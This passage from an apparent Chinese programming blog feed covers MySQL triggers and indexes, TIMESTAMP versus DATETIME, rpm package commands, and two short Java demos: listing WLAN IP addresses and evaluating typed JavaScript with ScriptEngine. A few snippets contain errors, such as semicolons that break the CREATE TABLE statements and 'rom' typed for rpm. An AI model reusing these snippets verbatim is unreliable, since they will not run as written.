<span class="keyword">INSERT</span>,<span class="keyword">AFTER</span> <span class="keyword">DELETE</span>,<span class="keyword">AFTER</span> <span class="keyword">UPDATE</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;其中，触发器名参数指要创建的触发器的名字。<br>&nbsp;&nbsp;&nbsp;&nbsp;对同一个表相同触发时间的相同触发事件，只能定义一个触发器。<br>&nbsp;&nbsp;&nbsp;&nbsp;触发器只能创建在永久表上，不能对临时表创建触发器。</p>
<p>创建有多个执行语句的触发器<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器名 <span class="keyword">BEFORE</span>|<span class="keyword">AFTER</span> 触发事件</div><div class="line"><span class="keyword">ON</span> 表名 <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span></div><div class="line"><span class="keyword">BEGIN</span></div><div class="line">    执行语句列表</div><div class="line"><span class="keyword">END</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;其中，BEGIN与END之间的执行语句列表参数表示需要执行的多个语句，不同语句用分号隔开。</p>
<blockquote>
<p>tips: 一般情况下，MySQL默认是以 ; 作为结束执行语句，与触发器中需要的分行起冲突。为解决此问题可用DELIMITER，如：DELIMITER ||, 可以将结束符号变成 || 。当触发器创建完成后，可以用DELIMITER; 来将结束符变成 ; 。</p>
</blockquote>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; DELIMITER ||</div><div class="line">mysql&gt; CREATE TRIGGER demo BEFORE DELETE</div><div class="line">    -<span class="ruby">&gt; ON users FOR EACH ROW</span></div><div class="line"><span class="ruby">    -&gt; <span class="keyword">BEGIN</span></span></div><div class="line"><span class="ruby">    -&gt; INSERT INTO logs VALUES(NOW());</span></div><div class="line"><span class="ruby">    -&gt; INSERT INTO logs VALUES(NOW());</span></div><div class="line"><span class="ruby">    -&gt; <span class="keyword">END</span></span></div><div class="line"><span class="ruby">    -&gt; <span class="params">||</span></span></div><div class="line"><span class="ruby">Query OK, <span class="number">0</span> rows affected (<span class="number">0</span>.<span class="number">06</span> sec)</span></div><div class="line"><span class="ruby"></span></div><div class="line"><span class="ruby">mysql&gt; DELIMITER ;</span></div></pre></td></tr></table></figure>
<p>&nbsp;&nbsp;&nbsp;&nbsp;上面的语句中，开头将结束符号定义为||，中间定义一个触发器，一旦有满足条件的删除操作，就会执行BEGIN和END中的语句，接着用||结束。最后使用DELIMITER ; 将结束符号还原。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>现有表如下：<br>用户users表<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">create table users(</div><div class="line">id int(11) unsigned <span class="keyword">not</span> <span class="literal">null</span> auto_increment;</div><div class="line">name varchar(255)<span class="built_in"> default </span><span class="literal">null</span>,</div><div class="line">add_time int(11)<span class="built_in"> default </span><span class="literal">null</span>,</div><div class="line">primary key(id),</div><div class="line">key name(name(250)) using btree</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>日志logs表：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">logs</span>(</div><div class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> auto_increment;</div><div class="line">log varchar(255) default null <span class="keyword">comment</span> <span class="string">'日志说明'</span>,</div><div class="line">primary <span class="keyword">key</span>(<span class="keyword">id</span>)</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;需求是：当在users中插入一条数据，就会在logs中生成一条日志信息。<br>创建触发器：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">DELIMITER $</div><div class="line">CREATE TRIGGER user_log AFTER INSERT ON<span class="built_in"> users </span><span class="keyword">FOR</span> EACH ROW</div><div class="line">BEGIN</div><div class="line">DECLARE s1 VARCHAR(40) character <span class="builtin-name">set</span> utf8;</div><div class="line">DECLARE s2 VARCHAR(20) character <span class="builtin-name">set</span> utf8;#后面发现中文字符编码出现乱码，这里设置字符集</div><div class="line"><span class="builtin-name">SET</span> s2 = <span class="string">" is created"</span>;</div><div class="line"><span class="builtin-name">SET</span> s1 = CONCAT(NEW.name,s2);     #函数CONCAT可以将字符串连接</div><div class="line">INSERT INTO logs(log) values(s1);</div><div class="line">END $</div><div class="line">DELIMITER ;</div></pre></td></tr></table></figure></p>
<h2 id="查看触发器"><a href="#查看触发器" class="headerlink" title="查看触发器"></a>查看触发器</h2><p>show triggers语句查看触发器信息。</p>
<blockquote>
<p>show triggers无法查询指定的触发器。</p>
</blockquote>
<p>在triggers表中查看触发器信息<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> information_schema.triggers;</div></pre></td></tr></table></figure></p>
<p>同时该方法可以查询制定触发器的详细信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> information_schema.triggers <span class="keyword">where</span> trigger_name= <span class="string">'user_log'</span>;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>tips: 所有的触发器信息都存储在information_schema数据库下的triggers表中，可以使用select语句查询，如果触发器信息过多，最好通过t字段指定查询。</p>
</blockquote>
<h2 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;一次可以删除一个触发程序，如果没有指定schema_name, 默认为当前数据库，具体语法如下:<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> [schema_name.] trigger_name;</div></pre></td></tr></table></figure></p>
<p>例如，要删除users表上的触发器user_log，可以使用如下命令:<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span> <span class="keyword">trigger</span> user_log;</div></pre></td></tr></table></figure></p>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;触发器会有以下两种限制：<br>1、触发程序不能调用将数据返回客户端的存储程序，也不能使用采用CALL语句的动态SQL语句，但是允许存储程序通过参数将数据返回触发程序，也就是存储过程或者函数通过OUT或者INOUT类型的参数将数据返回触发器是可以的，但是不能调用直接返回数据的过程。<br>2、不能在触发器中使用以显示或隐藏方式开始或结束事务的语句，如STAERT TRANS-ACTION,COMMIT或ROLLBACK。<br>&nbsp;&nbsp;&nbsp;&nbsp;注意事项：MySQL的触发器是按照BEFORE触发器、行操作、AFTER触发器是顺序执行的，其中任何一步发生错误都不会继续执行剩下的操作，如果对事务表进行的操作，如果出现错误，那么将会被回滚，如果是对非事务表进行操作，那么就无法回滚了，数据可能会出错。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;触发器是基于行触发的，所以删除、新增或者修改操作可能都会激活触发器，所以不要编写过于复杂的触发器，也不要增加过得的触发器，这样会对数据的插入、修改或者删除带来比较严重的影响，同时也会带来可移植性差的后果，所以在设计触发器的时候一定要有所考虑。<br>&nbsp;&nbsp;&nbsp;&nbsp;触发器是一种特殊的存储过程，它在插入，删除或修改特定表中的数据时触发执行，它比数据库本身标准的功能有更精细和更复杂的数据控制能力。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;数据库触发器有以下的作用：<br>1、安全性。可以基于数据库的值使用户具有操作数据库的某种权利。</p>
<ul>
<li>可以基于时间限制用户的操作，例如不允许下班后和节假日修改数据库数据。</li>
<li>可以基于数据库中的数据限制用户的操作，例如不允许股票的价格的升幅一次超过10%。</li>
</ul>
<p>2、审计。可以跟踪用户对数据库的操作。</p>
<ul>
<li>审计用户操作数据库的语句</li>
<li>把用户对数据库的更新写入审计表</li>
</ul>
<p>3、实现复杂的数据完整性规则。</p>
<ul>
<li>实现非标准的数据完整性检查和约束。触发器可产生比规则更为复杂的限制。与规则不同，触发器可以引用列或数据库对象，例如，触发器可回退任何企图吃进超过自己保证金的期货。</li>
</ul>
<p>4、实现复杂的非标准的数据库相关完整性规则。触发器可以对数据库中相关的表进行连环更新。例如，在auths表author_code列上的删除触发器可导致相应删除在其它表中的与之匹配的行。</p>
<p>5、同步实时地复制表中的数据。</p>
<p>6、自动计算数据值，如果数据的值达到了一定的要求，则进行特定的处理。例如，如果公司的账号上的资金低于5万元则立即给财务人员发送警告数据。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;触发器是与表有关的数据库对象，在满足定义条件时触发，并执行触发器中定义的语句集合。触发器的这种特性可以协助应用在数据库端确保数据的完整性。&lt;br&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="http://www.sanstylemc.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>获取无线局域网适配器IP</title>
    <link href="http://www.sanstylemc.cn/2018/07/24/%E8%8E%B7%E5%8F%96%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91%E9%80%82%E9%85%8D%E5%99%A8IP/"/>
    <id>http://www.sanstylemc.cn/2018/07/24/获取无线局域网适配器IP/</id>
    <published>2018-07-24T11:30:20.000Z</published>
    <updated>2018-07-31T11:34:55.811Z</updated>
    
    <content type="html"><![CDATA[<p>RT，嗯!<br><a id="more"></a></p>
<div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta"><span class="meta-keyword">import</span> java.net.InetAddress;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> java.net.NetworkInterface;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> java.util.ArrayList;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> java.util.Enumeration;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> java.util.List;</span></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mc_07241</span> </span>&#123;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</div><div class="line">		getLocalIP();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; getLocalIP() &#123;</div><div class="line">		List&lt;String&gt; ipList = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">		InetAddress ip = <span class="literal">null</span>;</div><div class="line">		<span class="keyword">try</span> &#123;</div><div class="line">			Enumeration&lt;NetworkInterface&gt; netInterfaces = (Enumeration&lt;NetworkInterface&gt;) NetworkInterface</div><div class="line">					.getNetworkInterfaces();</div><div class="line">			<span class="keyword">while</span> (netInterfaces.hasMoreElements()) &#123;</div><div class="line">				NetworkInterface ni = (NetworkInterface) netInterfaces.nextElement();</div><div class="line">				<span class="keyword">if</span> (ni.getName().indexOf(<span class="string">"wlan"</span>) == <span class="number">-1</span>)</div><div class="line">					<span class="keyword">continue</span>;</div><div class="line">				<span class="comment">// 遍历所有ip</span></div><div class="line">				Enumeration&lt;InetAddress&gt; ips = ni.getInetAddresses();</div><div class="line">				<span class="keyword">while</span> (ips.hasMoreElements()) &#123;</div><div class="line">					ip = (InetAddress) ips.nextElement();</div><div class="line">					<span class="keyword">if</span> (<span class="literal">null</span> == ip || <span class="string">""</span>.equals(ip)) &#123;</div><div class="line">						<span class="keyword">continue</span>;</div><div class="line">					&#125;</div><div class="line">					String sIP = ip.getHostAddress();</div><div class="line">					<span class="keyword">if</span> (sIP == <span class="literal">null</span> || sIP.indexOf(<span class="string">":"</span>) &gt; <span class="number">-1</span>) &#123;</div><div class="line">						<span class="keyword">continue</span>;</div><div class="line">					&#125;</div><div class="line">					ipList.add(sIP);</div><div class="line">					System.out.println(sIP);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">			e.printStackTrace();</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> ipList;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RT，嗯!&lt;br&gt;
    
    </summary>
    
    
      <category term="Java" scheme="http://www.sanstylemc.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java执行输入的js代码</title>
    <link href="http://www.sanstylemc.cn/2018/07/24/Java%E6%89%A7%E8%A1%8C%E8%BE%93%E5%85%A5%E7%9A%84js%E4%BB%A3%E7%A0%81/"/>
    <id>http://www.sanstylemc.cn/2018/07/24/Java执行输入的js代码/</id>
    <published>2018-07-24T08:25:32.000Z</published>
    <updated>2018-07-24T08:28:55.123Z</updated>
    
    <content type="html"><![CDATA[<p>JDK1.6版添加了新的ScriptEngine类，允许用户直接执行js代码。<br><a id="more"></a><br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta"><span class="meta-keyword">import</span> java.util.Scanner;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> javax.script.ScriptEngine;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> javax.script.ScriptEngineManager;</span></div><div class="line"><span class="meta"><span class="meta-keyword">import</span> javax.script.ScriptException;</span>  <span class="comment">/*直接调用js代码*/</span></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mc_07241</span> </span>&#123;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args)&#123;</div><div class="line">		ScriptEngineManager manager = <span class="keyword">new</span> ScriptEngineManager();</div><div class="line">		ScriptEngine engine = manager.getEngineByName(<span class="string">"javascript"</span>);</div><div class="line">		<span class="comment">/*通过脚本名称获取脚本引擎*/</span></div><div class="line">		Scanner sc= <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		<span class="keyword">try</span> &#123;</div><div class="line">			System.out.println(engine.eval(sc.nextLine()));</div><div class="line">			<span class="comment">/*不能调用浏览器中定义的js函数。 错误，会抛出alert等引用不存在的异常*/</span></div><div class="line">		&#125; <span class="keyword">catch</span> (ScriptException e) &#123;</div><div class="line">			e.printStackTrace();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JDK1.6版添加了新的ScriptEngine类，允许用户直接执行js代码。&lt;br&gt;
    
    </summary>
    
    
      <category term="Java" scheme="http://www.sanstylemc.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>索引</title>
    <link href="http://www.sanstylemc.cn/2018/07/24/%E7%B4%A2%E5%BC%95/"/>
    <id>http://www.sanstylemc.cn/2018/07/24/索引/</id>
    <published>2018-07-24T06:29:27.000Z</published>
    <updated>2018-07-24T06:41:03.555Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。</p>
<p><code>创建索引时，需要确保索引是应用在SQL查询语句的条件(一般作为WHERE子句的条件)</code></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p>
<p><code>缺点</code>: 虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行<code>INSERT</code>、<code>UPDATE</code>和<code>DELETE</code>。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。</p>
<h2 id="普通索引"><a href="#普通索引" class="headerlink" title="普通索引"></a>普通索引</h2><p>1、创建索引<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">index</span> indexName <span class="keyword">on</span> mytable(username(<span class="built_in">length</span>));</div></pre></td></tr></table></figure></p>
<p>如果是char、varchar类型，length可以小于字段实际长度；如果是blob和text类型，必须指定length。<br>2、修改表结构(添加索引)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tableName <span class="keyword">add</span> <span class="keyword">index</span> indexName(columnName);</div></pre></td></tr></table></figure></p>
<p>3、创建表的时候直接指定<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> mytable(</div><div class="line"><span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">username <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line"><span class="keyword">index</span> [indexName] (username(<span class="keyword">length</span>))</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>4、删除索引的语法<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span> <span class="keyword">index</span> [indexName] <span class="keyword">on</span> mytable;</div></pre></td></tr></table></figure></p>
<h2 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h2><p>它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。<br>1、创建索引<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> indexName <span class="keyword">on</span> mytable(username(<span class="built_in">length</span>));</div></pre></td></tr></table></figure></p>
<p>2、修改表结构<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> mytable <span class="keyword">add</span> <span class="keyword">unique</span> [indexName] (username(<span class="keyword">length</span>));</div></pre></td></tr></table></figure></p>
<p>3、创建表的时候直接指定<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> mytable(</div><div class="line"><span class="keyword">id</span> <span class="built_in">int</span> <span class="literal">null</span>,</div><div class="line">username <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line"><span class="keyword">unique</span> [indexName] (username(<span class="keyword">length</span>))</div><div class="line">);</div></pre></td></tr></table></figure></p>
<h2 id="使用alter命令添加和删除索引"><a href="#使用alter命令添加和删除索引" class="headerlink" title="使用alter命令添加和删除索引"></a>使用alter命令添加和删除索引</h2><p>有四种方式来添加数据表的索引：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tbl_name <span class="keyword">add</span> primary <span class="keyword">key</span>(column_list);</div></pre></td></tr></table></figure></p>
<p>该语句添加一个主键，这意味着索引值必须是唯一的，且不能为null。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tbl_name <span class="keyword">add</span> <span class="keyword">unique</span> index_name(column_list);</div></pre></td></tr></table></figure></p>
<p>这条语句创建索引的值必须是唯一的(除了null，外，null可能会出现多次)。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tbl_name <span class="keyword">add</span> <span class="keyword">index</span> index_name(column_list);</div></pre></td></tr></table></figure></p>
<p>添加普通索引，索引值可出现多次。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tbl_name <span class="keyword">add</span> fulltext index_name(column_list);</div></pre></td></tr></table></figure></p>
<p>该语句指定了索引为fulltext，用于全文索引。</p>
<h2 id="显示索引信息"><a href="#显示索引信息" class="headerlink" title="显示索引信息"></a>显示索引信息</h2><p>可以使用show index命令来列出表中的相关的索引信息。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> table_name;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。&lt;br&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="http://www.sanstylemc.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>TIMESTAMP和DATETIME</title>
    <link href="http://www.sanstylemc.cn/2018/07/24/TIMESTAMP%E5%92%8CDATETIME/"/>
    <id>http://www.sanstylemc.cn/2018/07/24/TIMESTAMP和DATETIME/</id>
    <published>2018-07-24T03:03:43.000Z</published>
    <updated>2018-07-24T03:04:21.827Z</updated>
    
    <content type="html"><![CDATA[<p>TIMESTAMP和DATETIME的表示方法非常类似，区别主要有以下几点。<br><a id="more"></a></p>
<p>1、TIMESTAMP支持的时间范围比较小，其取值范围从19700101080001到2038年的某个时间，而DATETIME是从1000-01-01 00:00:00 到 9999-12-31 23:59:59，范围更大。<br>2、表中的第一个TIMESTAMP列自动设置为系统时间。如果在一个TIMESTAMP列中插入NULL，则该列值将自动设置为当前的日期和时间。在插入或更新一行但不明确给TIMESTAMP列赋值时也会自动设置该列的值为当前的日期和时间，当插入的值超出取值范围时，MySQL认为该值溢出，使用”0000-00-00 00:00:00”进行填补。<br>3、TIMESTAMP的插入和查询都受当地时区的影响，更能反应出实际的日期。而DATETIME则只能反应出插入时当地的时区，其他时区的人查看数据必然会有误差的。<br>4、TIMESTAMP的属性受MySQL版本和服务器SQLMode的影响很大。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TIMESTAMP和DATETIME的表示方法非常类似，区别主要有以下几点。&lt;br&gt;
    
    </summary>
    
    
      <category term="失误锦集" scheme="http://www.sanstylemc.cn/tags/%E5%A4%B1%E8%AF%AF%E9%94%A6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>rpm命令</title>
    <link href="http://www.sanstylemc.cn/2018/07/24/rpm%E5%91%BD%E4%BB%A4/"/>
    <id>http://www.sanstylemc.cn/2018/07/24/rpm命令/</id>
    <published>2018-07-24T01:17:49.000Z</published>
    <updated>2018-07-24T01:19:32.582Z</updated>
    
    <content type="html"><![CDATA[<p>对于一个rpm包来说，都是有”-“和”.”构成的，基本上有以下几部分组成：<code>包名</code>、<code>版本信息</code>、<code>发布版本号</code>、<code>运行平台</code>，当出现noarch, 代表的是软件可以平台兼容。<br><a id="more"></a></p>
<h2 id="查询系统已经安装的软件信息"><a href="#查询系统已经安装的软件信息" class="headerlink" title="查询系统已经安装的软件信息"></a>查询系统已经安装的软件信息</h2><p>1、查询系统中已经安装的软件<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm -qa</span></div></pre></td></tr></table></figure></p>
<p>2、查询一个已经安装的文件属于哪个软件包<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qf 文件名的绝对路径</div></pre></td></tr></table></figure></p>
<p>3、查询已安装软件包都安装到何处<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm -ql 软件名</span></div><div class="line"><span class="attribute">软件名定义</span>: rpm包去除平台信息和后缀后的信息</div></pre></td></tr></table></figure></p>
<p>4、查询一个已安装软件包的信息<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qi 软件名</div></pre></td></tr></table></figure></p>
<p>5、查看一下已安装软件的配置文件<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rom</span> -qc 软件名</div></pre></td></tr></table></figure></p>
<p>6、查看一个已安装软件的文档安装位置<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qd 软件名</div></pre></td></tr></table></figure></p>
<p>7、查看一下已安装软件所依赖的软件包及文件<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm -<span class="built_in">qR</span> 软件名</div></pre></td></tr></table></figure></p>
<h2 id="对于未安装的软件包信息查询"><a href="#对于未安装的软件包信息查询" class="headerlink" title="对于未安装的软件包信息查询"></a>对于未安装的软件包信息查询</h2><p>1、查看一个软件包的用途、版本等信息<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qpi rpm文件</div></pre></td></tr></table></figure></p>
<p>2、查看软件包的文档所在的位置<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qpl rpm文件</div></pre></td></tr></table></figure></p>
<p>3、查看软件包的文档所在的位置<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qpd rpm文件</div></pre></td></tr></table></figure></p>
<p>4、查看一个软件包的配置文件<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qpc rpm文件</div></pre></td></tr></table></figure></p>
<p>5、查看一个软件包的依赖关系<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -qpR rpm文件</div></pre></td></tr></table></figure></p>
<h2 id="软件包的安装、升级、删除等"><a href="#软件包的安装、升级、删除等" class="headerlink" title="软件包的安装、升级、删除等"></a>软件包的安装、升级、删除等</h2><p>1、安装或者升级一个rpm包<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rpm -ivh rpm文件 <span class="string">[安装]</span></div><div class="line">rpm -Uvh rpm文件 <span class="string">[更新]</span></div></pre></td></tr></table></figure></p>
<p>2、删除一个rpm包<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">rpm</span> -e 软件名</div></pre></td></tr></table></figure></p>
<p>如果需要不管依赖问题，强制删除软件，在如上命令后加上<code>--nodeps</code>。</p>
